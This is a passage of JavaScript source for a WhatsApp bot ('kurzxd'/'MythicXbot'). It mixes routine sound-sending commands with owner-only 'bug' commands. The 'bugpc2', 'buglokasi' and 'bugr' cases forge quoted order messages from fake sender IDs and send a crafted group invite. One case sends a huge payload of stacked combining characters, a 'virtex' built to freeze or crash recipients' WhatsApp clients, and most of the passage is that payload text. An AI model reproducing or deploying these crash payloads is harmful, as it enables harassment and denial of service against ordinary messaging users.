    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${spamvirtex}.${virtexbykurzxd}`, mimetype: 'application/txt'})
break
         case 'sound26':
         const sound26 = fs.readFileSync('audio/sound26.mp3')
         kurzxd.sendMessage(from, sound26, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound27':
         const sound27 = fs.readFileSync('audio/sound27.mp3')
         kurzxd.sendMessage(from, sound27, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound28':
         const sound28 = fs.readFileSync('audio/sound28.mp3')
         kurzxd.sendMessage(from, sound28, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound29':
         const sound29 = fs.readFileSync('audio/sound29.mp3')
         kurzxd.sendMessage(from, sound29, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound30':
         const sound30 = fs.readFileSync('audio/sound30.mp3')
         kurzxd.sendMessage(from, sound30, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'bugpc2':
					if (!kurz.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await kurzxd.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `kurzxd                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/pirtek/kurzxd.jpeg')
}
}, {quoted:imeu, contextInfo:{}})
kurzxd.relayWAMessage(jk)
await setTimeout(() => {
reply('kurzxd     ')
}, 3000)
break
         case 'sound31':
         const sound31 = fs.readFileSync('audio/sound31.mp3')
         kurzxd.sendMessage(from, sound31, MessageType.audio, {quoted: kurz, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'buglokasi':
if (!kurz.key.fromMe && !isOwner) return
kurzxd.updatePresence(from, Presence.composing)
		       kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${namaowner}`,
						address: `${namabot}`,
                        jpegThumbnail: reply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${namaowner}`,
    orderTitle: `${namabot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugr':
if (!kurz.key.fromMe && !isOwner) return
             await kurzxd.toggleDisappearingMessages(from)
wew = fs.readFileSync(`./src/logo.jpg`)
lzain = `
*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผ
ิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicX
bot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXb
ot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicX
bot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨ